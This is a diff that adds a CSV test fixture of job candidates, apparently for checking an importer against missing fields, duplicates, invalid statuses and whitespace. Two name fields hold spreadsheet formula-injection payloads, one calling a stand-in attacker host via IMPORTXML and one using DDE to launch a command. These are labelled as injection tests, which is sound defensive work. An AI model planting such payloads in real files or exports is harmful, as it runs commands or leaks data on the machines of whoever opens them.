@@ -1,0 +1,16 @@
+name,email,phone,skills,experience,status,source,location,talent_type,notes
+Priya Sharma,priya.sharma@techcorp.com,+91-9876543210,"Python, AI/ML;Cloud|DevOps",8,Shortlisted,LinkedIn,Chennai,Trainer,Top candidate for Q3
+Rahul Verma,rahul.verma@freelance.dev,+91-9123456780,AWS/Azure;Kubernetes|Terraform,12,Under Review,Referral,Bangalore,Consultant,
+Meera Krishnan,,+91-9988776655,"Figma, UI/UX Design; React",6,New,Email,Mumbai,Freelancer,Missing email test
+,arjun.mehta@corp.io,+91-9871234567,"React|Node.js;TypeScript, PostgreSQL",5,Approved,Job Portal,Hyderabad,Employee,Missing name test
+Divya Nair,divya.nair@mentor.io,,Leadership/Coaching;Strategy|OKRs,15,Shortlisted,WhatsApp,Pune,Mentor,Missing phone test
+Karthik Rajan,karthik.r@datascience.in,+91-9654321098,"Python, R; Statistics|Tableau, Power BI",4,Super Approved,LinkedIn,Chennai,Trainer,Invalid status test
+Sneha Patel,sneha.patel@speakersbureau.com,+91-9543210987,Public Speaking/Innovation;Digital Transformation|Writing,10,Approved,Website,Delhi,Speaker,
+=IMPORTXML("http://evil.com"),evil@inject.com,+91-9432109876,Docker/CI-CD;Jenkins|Python,3,Rejected,Manual Entry,Jaipur,Contractor,CSV injection name
+Ananya Gupta,ananya.g@airesearch.org,+91-9321098765,"NLP, BERT;LLMs|Python, PyTorch, Hugging Face",7,Under Review,LinkedIn,Bangalore,Consultant,
+=cmd|' /C calc'!A0,cmd@inject.com,+91-9210987654,"Product Management, Agile;Roadmapping|SQL",9,Engaged,Referral,Mumbai,Employee,CSV injection name 2
+Priya Sharma,priya.sharma@techcorp.com,+91-9876543210,"Python, AI/ML;Cloud|DevOps",8,Shortlisted,LinkedIn,Chennai,Trainer,DUPLICATE of row 1
+Rohan Kapoor,rohan.kapoor@fintech.co,+91-9210987654,"Analytics, SQL;Stakeholder Management|Agile",9,Engaged,Job Portal,Mumbai,Employee,Duplicate phone with row 10
+Vikram Singh,vikram.singh@contractor.dev,+91-9432109876,"Docker, CI/CD; Jenkins| Python, Bash, Monitoring",3,Rejected,Manual Entry,Jaipur,Contractor,
+,,,,,,,,, 
+Aisha Nambiar,aisha@test.com,+91-9000000001,"  Python  ,  AI  ;  ML  ",5,New,LinkedIn,Kochi,Trainer,Skills with extra whitespace
